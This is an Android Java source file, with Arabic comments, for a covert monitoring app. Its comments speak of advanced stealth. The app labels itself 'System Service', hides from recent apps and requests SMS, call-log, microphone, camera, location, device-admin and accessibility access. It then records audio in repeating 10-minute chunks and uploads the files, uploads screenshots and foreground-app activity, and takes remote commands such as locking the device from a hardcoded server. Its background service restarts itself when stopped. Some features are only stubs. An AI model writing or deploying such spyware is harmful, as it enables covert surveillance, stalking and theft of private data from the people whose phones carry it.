package com.monitoring.client;

import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityService;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * تطبيق Android المحسن للمراقبة والتسجيل
 * يتضمن ميزات متقدمة للتخفي والمراقبة الشاملة
 */
public class EnhancedMonitoringApp extends Activity {
    
    private static final String TAG = "EnhancedMonitoring";
    private static final int REQUEST_CODE_PERMISSIONS = 1000;
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1001;
    private static final int REQUEST_CODE_DEVICE_ADMIN = 1002;
    
    // عنوان الخادم المحدث
    private static final String SERVER_URL = "https://0vhlizc3kv7p.manus.space";
    
    // معرف الجهاز الفريد
    private String deviceId;
    private String deviceName;
    
    // مكونات التسجيل
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    // مكونات تصوير الشاشة
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    
    // العميل HTTP
    private OkHttpClient httpClient;
    
    // مؤقت للمهام الدورية
    private Timer periodicTimer;
    
    // الصلاحيات المطلوبة
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CAMERA,
        Manifest.permission.SYSTEM_ALERT_WINDOW,
        Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إخفاء التطبيق من قائمة التطبيقات الحديثة
        hideFromRecentApps();
        
        // تهيئة المتغيرات
        initializeComponents();
        
        // طلب الصلاحيات
        requestPermissions();
        
        // تسجيل الجهاز
        registerDevice();
        
        // بدء الخدمات
        startServices();
        
        // بدء خدمة الخلفية
        startBackgroundService();
        
        // إنهاء النشاط وتشغيل الخدمة في الخلفية
        finish();
    }
    
    private void hideFromRecentApps() {
        // إخفاء التطبيق من قائمة التطبيقات الحديثة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            setTaskDescription(new android.app.ActivityManager.TaskDescription("System Service", null, 0));
        }
    }
    
    private void initializeComponents() {
        // إنشاء معرف فريد للجهاز
        SharedPreferences prefs = getSharedPreferences("system_prefs", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        
        if (deviceId == null) {
            deviceId = "DEV_" + System.currentTimeMillis() + "_" + Build.SERIAL.hashCode();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        
        // اسم الجهاز
        deviceName = Build.MODEL + " (" + Build.MANUFACTURER + ")";
        
        // إنشاء عميل HTTP مع إعدادات محسنة
        httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
            .build();
        
        // مدير الإسقاط
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        Log.d(TAG, "Enhanced monitoring initialized: " + deviceId + " - " + deviceName);
    }
    
    private void requestPermissions() {
        // التحقق من الصلاحيات المطلوبة
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS);
                return;
            }
        }
        
        // طلب صلاحية تصوير الشاشة
        requestScreenCapturePermission();
        
        // طلب صلاحيات المدير
        requestDeviceAdminPermission();
        
        // طلب صلاحية إمكانية الوصول
        requestAccessibilityPermission();
    }
    
    private void requestScreenCapturePermission() {
        if (projectionManager != null) {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_CAPTURE);
        }
    }
    
    private void requestDeviceAdminPermission() {
        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لخدمات النظام المتقدمة");
        startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN);
    }
    
    private void requestAccessibilityPermission() {
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK) {
                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                setupScreenCapture();
            }
        }
    }
    
    private void setupScreenCapture() {
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;
        
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "SystemCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(),
            null, null
        );
        
        imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                processScreenshot();
            }
        }, null);
    }
    
    private void registerDevice() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("device_name", deviceName);
            deviceInfo.put("device_type", "Android Enhanced");
            deviceInfo.put("os_version", Build.VERSION.RELEASE);
            deviceInfo.put("app_version", "2.0.0");
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            
            RequestBody body = RequestBody.create(
                MediaType.parse("application/json"),
                deviceInfo.toString()
            );
            
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/devices")
                .post(body)
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to register device", e);
                    // إعادة المحاولة بعد 30 ثانية
                    new Handler().postDelayed(() -> registerDevice(), 30000);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Device registered successfully");
                    } else {
                        Log.e(TAG, "Failed to register device: " + response.code());
                        // إعادة المحاولة بعد 30 ثانية
                        new Handler().postDelayed(() -> registerDevice(), 30000);
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error registering device", e);
        }
    }
    
    private void startServices() {
        // بدء المهام الدورية
        periodicTimer = new Timer();
        
        // تحديث حالة الجهاز كل 30 ثانية
        periodicTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                updateDeviceStatus();
            }
        }, 0, 30000);
        
        // التقاط لقطة شاشة كل دقيقتين
        periodicTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                captureScreenshot();
            }
        }, 10000, 120000);
        
        // مراقبة الأنشطة كل 10 ثوان
        periodicTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                monitorActivities();
            }
        }, 5000, 10000);
        
        // بدء التسجيل الصوتي
        startAudioRecording();
        
        // مراقبة الرسائل والمكالمات
        startMessageMonitoring();
        startCallMonitoring();
    }
    
    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, MonitoringBackgroundService.class);
        serviceIntent.putExtra("device_id", deviceId);
        serviceIntent.putExtra("server_url", SERVER_URL);
        startService(serviceIntent);
    }
    
    private void updateDeviceStatus() {
        try {
            // الحصول على مستوى البطارية
            int batteryLevel = getBatteryLevel();
            
            // الحصول على الموقع (إذا كانت الصلاحية متاحة)
            double[] location = getCurrentLocation();
            
            JSONObject statusUpdate = new JSONObject();
            statusUpdate.put("battery_level", batteryLevel);
            statusUpdate.put("location_lat", location[0]);
            statusUpdate.put("location_lng", location[1]);
            statusUpdate.put("timestamp", System.currentTimeMillis());
            statusUpdate.put("is_active", true);
            
            RequestBody body = RequestBody.create(
                MediaType.parse("application/json"),
                statusUpdate.toString()
            );
            
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/devices/" + deviceId + "/status")
                .put(body)
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to update device status", e);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Device status updated");
                        
                        // التحقق من الأوامر الجديدة
                        checkForCommands();
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error updating device status", e);
        }
    }
    
    private void checkForCommands() {
        try {
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/devices/" + deviceId + "/commands")
                .get()
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to check commands", e);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        String responseBody = response.body().string();
                        processCommands(responseBody);
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error checking commands", e);
        }
    }
    
    private void processCommands(String commandsJson) {
        try {
            JSONObject commands = new JSONObject(commandsJson);
            
            if (commands.has("start_recording") && commands.getBoolean("start_recording")) {
                startAudioRecording();
            }
            
            if (commands.has("stop_recording") && commands.getBoolean("stop_recording")) {
                stopCurrentAudioRecording();
            }
            
            if (commands.has("take_screenshot") && commands.getBoolean("take_screenshot")) {
                captureScreenshot();
            }
            
            if (commands.has("lock_device") && commands.getBoolean("lock_device")) {
                lockDevice();
            }
            
            if (commands.has("play_sound") && commands.getBoolean("play_sound")) {
                playAlarmSound();
            }
            
            if (commands.has("get_location") && commands.getBoolean("get_location")) {
                sendCurrentLocation();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing commands", e);
        }
    }
    
    private int getBatteryLevel() {
        android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            return (int) ((level / (float) scale) * 100);
        }
        
        return 0;
    }
    
    private double[] getCurrentLocation() {
        // يمكن تنفيذ الحصول على الموقع الحقيقي هنا
        // للتبسيط، نعيد موقع افتراضي
        return new double[]{24.7136, 46.6753}; // الرياض
    }
    
    private void startAudioRecording() {
        try {
            if (isRecording) return;
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = deviceId + "_audio_" + timestamp + ".m4a";
            
            File audioDir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "system_recordings");
            if (!audioDir.exists()) {
                audioDir.mkdirs();
            }
            
            File audioFile = new File(audioDir, fileName);
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(128000);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            Log.d(TAG, "Enhanced audio recording started: " + fileName);
            
            // إيقاف التسجيل بعد 10 دقائق ورفعه
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    stopAudioRecording(audioFile);
                }
            }, 600000); // 10 دقائق
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting audio recording", e);
        }
    }
    
    private void stopCurrentAudioRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                Log.d(TAG, "Audio recording stopped by command");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping audio recording", e);
        }
    }
    
    private void stopAudioRecording(File audioFile) {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                
                // رفع الملف الصوتي
                uploadAudioFile(audioFile);
                
                Log.d(TAG, "Audio recording completed and queued for upload");
                
                // بدء تسجيل جديد بعد 30 ثانية
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        startAudioRecording();
                    }
                }, 30000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping audio recording", e);
        }
    }
    
    private void uploadAudioFile(File audioFile) {
        try {
            RequestBody fileBody = RequestBody.create(MediaType.parse("audio/m4a"), audioFile);
            
            MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", audioFile.getName(), fileBody)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("duration", "600") // 10 دقائق
                .addFormDataPart("quality", "high")
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .build();
            
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/audio/upload")
                .post(requestBody)
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to upload audio file", e);
                    // إعادة المحاولة لاحقاً
                    new Handler().postDelayed(() -> uploadAudioFile(audioFile), 60000);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Audio file uploaded successfully");
                        // حذف الملف المحلي بعد الرفع الناجح
                        audioFile.delete();
                    } else {
                        Log.e(TAG, "Failed to upload audio file: " + response.code());
                        // إعادة المحاولة لاحقاً
                        new Handler().postDelayed(() -> uploadAudioFile(audioFile), 60000);
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading audio file", e);
        }
    }
    
    private void captureScreenshot() {
        if (imageReader != null) {
            Log.d(TAG, "Screenshot capture triggered");
        }
    }
    
    private void processScreenshot() {
        try {
            Image image = imageReader.acquireLatestImage();
            if (image == null) return;
            
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();
            
            Bitmap bitmap = Bitmap.createBitmap(
                image.getWidth() + rowPadding / pixelStride,
                image.getHeight(),
                Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);
            
            // ضغط الصورة
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
            byte[] imageBytes = baos.toByteArray();
            
            // رفع لقطة الشاشة
            uploadScreenshot(imageBytes);
            
            image.close();
            bitmap.recycle();
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing screenshot", e);
        }
    }
    
    private void uploadScreenshot(byte[] imageBytes) {
        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = deviceId + "_screenshot_" + timestamp + ".jpg";
            
            RequestBody fileBody = RequestBody.create(MediaType.parse("image/jpeg"), imageBytes);
            
            MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName, fileBody)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
                .build();
            
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/screenshots/upload")
                .post(requestBody)
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to upload screenshot", e);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Screenshot uploaded successfully");
                    } else {
                        Log.e(TAG, "Failed to upload screenshot: " + response.code());
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading screenshot", e);
        }
    }
    
    private void monitorActivities() {
        try {
            // مراقبة التطبيق الحالي
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                java.util.List<android.app.ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
                if (!tasks.isEmpty()) {
                    android.app.ActivityManager.RunningTaskInfo task = tasks.get(0);
                    String packageName = task.topActivity.getPackageName();
                    String className = task.topActivity.getClassName();
                    
                    // إرسال معلومات النشاط
                    sendActivityInfo(packageName, className);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error monitoring activities", e);
        }
    }
    
    private void sendActivityInfo(String packageName, String className) {
        try {
            JSONObject activityInfo = new JSONObject();
            activityInfo.put("device_id", deviceId);
            activityInfo.put("package_name", packageName);
            activityInfo.put("class_name", className);
            activityInfo.put("timestamp", System.currentTimeMillis());
            
            RequestBody body = RequestBody.create(
                MediaType.parse("application/json"),
                activityInfo.toString()
            );
            
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/activities")
                .post(body)
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    // تجاهل الأخطاء لتجنب الإزعاج
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    // تجاهل الاستجابة
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending activity info", e);
        }
    }
    
    private void startMessageMonitoring() {
        // يمكن تنفيذ مراقبة الرسائل هنا
        // يتطلب صلاحيات إضافية ومراقبة قاعدة بيانات الرسائل
    }
    
    private void startCallMonitoring() {
        // يمكن تنفيذ مراقبة المكالمات هنا
        // يتطلب صلاحيات إضافية ومراقبة سجل المكالمات
    }
    
    private void lockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
            
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
                Log.d(TAG, "Device locked successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error locking device", e);
        }
    }
    
    private void playAlarmSound() {
        try {
            android.media.MediaPlayer mp = android.media.MediaPlayer.create(this, android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM));
            if (mp != null) {
                mp.start();
                
                // إيقاف الصوت بعد 10 ثوان
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (mp.isPlaying()) {
                            mp.stop();
                        }
                        mp.release();
                    }
                }, 10000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error playing alarm sound", e);
        }
    }
    
    private void sendCurrentLocation() {
        try {
            double[] location = getCurrentLocation();
            
            JSONObject locationInfo = new JSONObject();
            locationInfo.put("device_id", deviceId);
            locationInfo.put("latitude", location[0]);
            locationInfo.put("longitude", location[1]);
            locationInfo.put("timestamp", System.currentTimeMillis());
            
            RequestBody body = RequestBody.create(
                MediaType.parse("application/json"),
                locationInfo.toString()
            );
            
            Request request = new Request.Builder()
                .url(SERVER_URL + "/api/devices/" + deviceId + "/location")
                .post(body)
                .addHeader("User-Agent", "SystemService/2.0")
                .build();
            
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to send location", e);
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "Location sent successfully");
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending location", e);
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // تنظيف الموارد
        if (periodicTimer != null) {
            periodicTimer.cancel();
        }
        
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping media recorder", e);
            }
        }
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
    }
    
    /**
     * خدمة الخلفية للمراقبة المستمرة
     */
    public static class MonitoringBackgroundService extends Service {
        
        private String deviceId;
        private String serverUrl;
        private Timer serviceTimer;
        
        @Override
        public void onCreate() {
            super.onCreate();
            Log.d(TAG, "Background monitoring service created");
        }
        
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (intent != null) {
                deviceId = intent.getStringExtra("device_id");
                serverUrl = intent.getStringExtra("server_url");
                
                startForegroundService();
                startPeriodicTasks();
            }
            
            return START_STICKY; // إعادة تشغيل الخدمة إذا تم إيقافها
        }
        
        private void startForegroundService() {
            // إنشاء إشعار للخدمة المقدمة (مطلوب في Android 8+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                    "system_service",
                    "System Service",
                    android.app.NotificationManager.IMPORTANCE_LOW
                );
                
                android.app.NotificationManager manager = getSystemService(android.app.NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
                
                android.app.Notification notification = new android.app.Notification.Builder(this, "system_service")
                    .setContentTitle("System Service")
                    .setContentText("Running system optimization")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
                
                startForeground(1, notification);
            }
        }
        
        private void startPeriodicTasks() {
            serviceTimer = new Timer();
            
            // مهمة دورية كل دقيقة للتأكد من استمرار الخدمة
            serviceTimer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    // إرسال نبضة للخادم
                    sendHeartbeat();
                }
            }, 0, 60000);
        }
        
        private void sendHeartbeat() {
            try {
                JSONObject heartbeat = new JSONObject();
                heartbeat.put("device_id", deviceId);
                heartbeat.put("service_status", "active");
                heartbeat.put("timestamp", System.currentTimeMillis());
                
                // إرسال النبضة للخادم
                // يمكن تنفيذ هذا باستخدام OkHttp
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending heartbeat", e);
            }
        }
        
        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
        
        @Override
        public void onDestroy() {
            super.onDestroy();
            
            if (serviceTimer != null) {
                serviceTimer.cancel();
            }
            
            // إعادة تشغيل الخدمة
            Intent restartIntent = new Intent(this, MonitoringBackgroundService.class);
            restartIntent.putExtra("device_id", deviceId);
            restartIntent.putExtra("server_url", serverUrl);
            startService(restartIntent);
        }
    }
    
    /**
     * مستقبل إدارة الجهاز
     */
    public static class MonitoringDeviceAdminReceiver extends DeviceAdminReceiver {
        
        @Override
        public void onEnabled(Context context, Intent intent) {
            super.onEnabled(context, intent);
            Log.d(TAG, "Device admin enabled");
        }
        
        @Override
        public void onDisabled(Context context, Intent intent) {
            super.onDisabled(context, intent);
            Log.d(TAG, "Device admin disabled");
        }
    }
    
    /**
     * خدمة إمكانية الوصول للمراقبة المتقدمة
     */
    public static class MonitoringAccessibilityService extends AccessibilityService {
        
        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            // مراقبة أحداث إمكانية الوصول
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                String className = event.getClassName() != null ? event.getClassName().toString() : "";
                
                // إرسال معلومات النشاط
                Log.d(TAG, "Window changed: " + packageName + " - " + className);
            }
        }
        
        @Override
        public void onInterrupt() {
            Log.d(TAG, "Accessibility service interrupted");
        }
    }
}

